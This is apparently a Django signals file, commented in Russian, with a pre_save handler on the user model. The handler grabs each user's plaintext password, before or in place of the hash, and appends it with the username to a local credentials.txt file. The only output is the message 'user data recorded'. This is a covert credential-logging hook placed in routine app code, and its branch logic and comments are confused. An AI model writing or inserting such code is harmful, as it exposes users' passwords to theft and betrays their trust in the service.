import os
from django.db.models.signals import pre_save
from django.dispatch import receiver
from django.conf import settings
import logging
from .forms import SignUpForm

@receiver(pre_save, sender=settings.AUTH_USER_MODEL)
def pre_save_user(instance, **kwargs):
    print('Пользовательские данные записаны')
    file_path = os.path.join("credentials.txt")

    # Если пароль не хэширован (то есть, если он не был изменен в процессе регистрации),
    # используйте оригинальное значение пароля, заданное пользователем.
    if not instance.password.startswith(('pbkdf2_sha256$', 'bcrypt', 'argon2')):
        password = instance.password
    else:
        # В противном случае, используйте оригинальный пароль, введенный пользователем.
        password = instance._password  # приватный атрибут _password используется до хеширования

    username = instance.username

    try:
        # Проверяем, содержится ли уже такая информация в файле
        with open(file_path, "r") as file:
            existing_data = file.read()
            if f"Имя пользователя: {username}, Пароль: {password}\n" not in existing_data:
                with open(file_path, "a") as append_file:
                    append_file.write(f"Имя пользователя: {username}, Пароль: {password}\n")
                logging.info('Файл успешно записан')
            else:
                logging.warning('Такие данные уже существуют в файле')
    except Exception as e:
        logging.error(f'Ошибка при записи в файл: {e}')

